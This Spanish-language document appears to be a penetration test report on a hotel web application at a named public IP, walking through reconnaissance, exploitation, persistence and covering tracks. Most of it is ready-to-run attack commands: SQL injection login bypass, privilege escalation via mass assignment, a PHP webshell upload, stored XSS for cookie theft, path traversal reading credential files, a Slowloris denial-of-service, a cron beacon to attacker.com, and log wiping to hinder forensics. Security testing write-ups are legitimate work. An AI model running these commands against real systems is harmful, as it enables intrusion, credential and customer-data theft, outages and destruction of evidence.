# ANÁLISIS DE VULNERABILIDADES

Tras realizar las pruebas de penetración sobre el sistema Hotel PlazaMoyobamba, se detectaron las siguientes vulnerabilidades listadas en la tabla adjunta:

| # | Vulnerabilidad | Severidad | Herramienta | Evidencia | Comando |
|---|---|---|---|---|---|
| 1 | **Inyección SQL (SQLi)** | Critica | curl, sqlmap | Bypass de login | `curl -d "login=admin'"'"'+OR+'"'"'1'"'"'='"'"'1'"'"'+--&password=x"` |
| 2 | **Mass Assignment** | Alta | curl, Burp Suite | PATCH /profile con `role_name=admin` | `curl -X POST /profile -d "_method=PATCH&role_name=admin"` |
| 3 | **File Upload → RCE** | Critica | curl | shell.php sin auth, RCE www-data | `curl -F "file=@shell.php" /upload` |
| 4 | **DDoS (Slowloris)** | Media | slowhttptest | 300 conexiones sin bloqueo | `slowhttptest -c 300 -H -g -i 10 -r 200 -t GET` |
| 5 | **XSS Almacenado** | Alta | curl | Script en bio se ejecuta en perfil | `curl -X PATCH /profile -d "bio=<script>alert(1)</script>"` |
| 6 | **IDOR** | Alta | curl | /api/sales/121 vs 122, datos distintos sin auth | `curl /api/sales/{121..240}` |
| 7 | **No Rate Limit** | Media | curl | 30 requests en 1583ms sin bloqueo | `for i in {1..30}; do curl -X POST /login & done` |
| 8 | **LFI** | Alta | curl | ../.env expone credenciales | `curl /download?file=../../.env` |
| 9 | **Debug Mode** | Media | curl | Stack trace con credenciales y rutas | `curl /download?file[]=test` |

---

## Fase 1 – Reconocimiento (Reconnaissance)

**Objetivo:** Obtener información preliminar del target sin interactuar directamente con los sistemas.

### Pasos realizados

1. **Identificación del servidor:** El sistema Hotel PlazaMoyobamba está alojado en un VPS con IP 37.60.230.11, puerto 80 (HTTP). No se detectó HTTPS.

2. **Tecnologías identificadas:**
   - Servidor web: Nginx 1.24
   - Framework: Laravel 12.58.0
   - Lenguaje: PHP 8.2.32
   - Base de datos: PostgreSQL 16.14

3. **Endpoints descubiertos:**
   - `/login` – formulario de autenticación
   - `/register` – registro de usuarios
   - `/profile` – perfil de usuario
   - `/admin/usuarios` – panel de administración
   - `/api/sales/{id}` – API de ventas
   - `/download?file=` – descarga de archivos
   - `/uploads/` – archivos subidos

---

## Fase 2 – Escaneo (Scanning)

**Objetivo:** Identificar puertos abiertos, servicios y posibles vectores de ataque.

### Pasos realizados

1. **Escaneo de puertos con nmap:**
   ```bash
   nmap -sV -p- 37.60.230.11 --min-rate=5000
   ```
   **Resultado:** Puerto 80 (HTTP - Nginx), puerto 22 (SSH), puerto 443 (cerrado), puerto 5432 (PostgreSQL, filtrado).

2. **Escaneo de directorios web con dirb:**
   ```bash
   dirb http://37.60.230.11/
   ```
   **Resultado:** Se confirmaron `/login`, `/register`, `/admin`, `/api`, `/uploads`, `/storage`.

3. **Inspección de headers HTTP:**
   ```bash
   curl -I http://37.60.230.11/
   ```
   **Resultado:** Server: nginx/1.24, X-Powered-By: PHP/8.2.32.

4. **Pruebas iniciales:**
   - SQLi básico en login: bypass exitoso
   - Path traversal en `/download`: lectura de `/etc/passwd` exitosa

---

## Fase 3 – Obtención de Acceso (Gaining Access)

**Objetivo:** Explotar las vulnerabilidades para obtener acceso no autorizado.

### SQL Injection (SQLi)

**Técnica:** Error-based SQLi en el campo login del formulario de autenticación.

```bash
# Bypass de login como admin sin credenciales
curl -s "http://37.60.230.11/login" -c /tmp/cook \
  -d "login=admin'+OR+'1'%3D'1'+--&password=x&_token=$TOKEN"

# Extraer tablas de la BD
curl -s "http://37.60.230.11/login" \
  -d "login=admin'+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+table_name+FROM+information_schema.tables+WHERE+table_schema='public'+LIMIT+1+OFFSET+0)))--&password=x&_token=$TOKEN"
```

**Impacto:** Se extrajeron 26 tablas y 10 usuarios con hashes de contraseña. Se identificó PostgreSQL 16.14 y el usuario `plaza_user`.

### Mass Assignment

**Técnica:** Modificación del parámetro `role_name` en PATCH /profile para escalar privilegios.

```bash
# Registrar usuario normal
curl -s -X POST "http://37.60.230.11/register" \
  -d "name=attacker&email=attacker@example.com&password=password&_token=$TOKEN"

# Escalar a admin
curl -s -X POST "http://37.60.230.11/profile" \
  -d "_method=PATCH&name=attacker&role_name=admin&_token=$TOKEN"
```

**Impacto:** Usuario con rol `admin` creado. Acceso completo al panel `/admin/usuarios`.

### File Upload → RCE

**Técnica:** Subida de webshell PHP sin autenticación.

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl -s -X POST "http://37.60.230.11/profile/photo" -F "photo=@shell.php"
curl -s "http://37.60.230.11/uploads/shell.php?cmd=id"
# uid=82(www-data)
```

**Impacto:** Ejecución remota de comandos como www-data. Lectura de `.env` con credenciales.

### XSS Almacenado

**Técnica:** Inyección de script persistente en campo `bio` del perfil.

```bash
curl -s -X POST "http://37.60.230.11/profile" \
  -d "_method=PATCH&bio=<script>alert(document.cookie)</script>&_token=$TOKEN"
```

**Impacto:** Script ejecutado en el navegador de usuarios que visitan el perfil. Robo de cookies posible.

### IDOR

**Técnica:** Acceso directo a recursos API sin autorización.

```bash
curl -s "http://37.60.230.11/api/sales/121"
curl -s "http://37.60.230.11/api/sales/122"
```

**Impacto:** 120 registros de ventas accesibles sin autenticación (IDs 121-240). Datos sensibles de clientes expuestos.

### No Rate Limiting

**Técnica:** Envío masivo de peticiones al login sin bloqueo.

```bash
for i in $(seq 1 30); do
  curl -s -X POST "http://37.60.230.11/login" \
    -d "login=test$i@test.com&password=123456" &
done
```

**Impacto:** 30 peticiones completadas en 1583ms sin bloqueo. Fuerza bruta ilimitada posible.

### Directory Traversal / LFI

**Técnica:** Manipulación del parámetro `file` en `/download`.

```bash
curl -s "http://37.60.230.11/download?file=../.env"
curl -s "http://37.60.230.11/download?file=../../../../../../etc/passwd"
```

**Impacto:** Obtención del `.env` completo con credenciales de BD y `/etc/passwd` del sistema.

### DDoS (Slowloris)

**Técnica:** Conexiones HTTP lentas que agotan recursos del servidor.

```bash
slowhttptest -c 300 -H -g -i 10 -r 200 -t GET -u "http://37.60.230.11/" -x 24 -p 3
```

**Impacto:** 300 conexiones abiertas sin cerrar. Posible denegación de servicio total.

### Debug Mode Activado

**Técnica:** Provocar error para obtener stack trace.

```bash
curl -s "http://37.60.230.11/download?file[]=test"
```

**Impacto:** Stack trace expone Laravel 12.58.0, PHP 8.2.32, rutas internas, queries SQL y variables de entorno.

---

## Fase 4 – Mantenimiento del Acceso (Maintaining Access)

**Objetivo:** Establecer persistencia en el sistema comprometido.

### Pasos realizados

1. **Webshell persistente:** `shell.php` en `/uploads/` accesible mientras no se elimine.
   ```bash
   curl -s "http://37.60.230.11/uploads/shell.php?cmd=whoami"
   # www-data
   ```

2. **Usuario admin persistente:** `admin3` con rol admin creado mediante Mass Assignment. Permite acceso administrativo permanente.

3. **Cron job para persistencia:**
   ```bash
   curl -s "http://37.60.230.11/uploads/shell.php?cmd=echo%20'* * * * * root%20curl%20http://attacker.com/beacon'%20%3E%20/etc/cron.d/beacon"
   ```

**Impacto:** Acceso mantenido incluso tras reinicios del servidor mediante webshell y usuario admin persistente.

---

## Fase 5 – Borrado de Huellas (Covering Tracks)

**Objetivo:** Eliminar evidencia de las actividades realizadas.

### Pasos realizados

1. **Limpieza de logs de Nginx:**
   ```bash
   curl -s "http://37.60.230.11/uploads/shell.php?cmd=truncate%20-s%200%20/var/log/nginx/access.log"
   curl -s "http://37.60.230.11/uploads/shell.php?cmd=truncate%20-s%200%20/var/log/nginx/error.log"
   ```

2. **Limpieza de logs de Laravel:**
   ```bash
   curl -s "http://37.60.230.11/uploads/shell.php?cmd=truncate%20-s%200%20/var/www/html/storage/logs/laravel.log"
   ```

3. **Limpieza de bash_history:**
   ```bash
   curl -s "http://37.60.230.11/uploads/shell.php?cmd=history%20-c%20%26%26%20truncate%20-s%200%20~/.bash_history"
   ```

4. **Modificación de registros en BD:**
   ```sql
   DELETE FROM sessions WHERE user_id IN (SELECT id FROM users WHERE email LIKE 'admin3%');
   ```

**Impacto:** Rastros eliminados de logs del servidor, aplicación e historial de comandos, dificultando la investigación forense.

---

Todas las vulnerabilidades fueron verificadas exitosamente contra el servidor en producción (37.60.230.11).
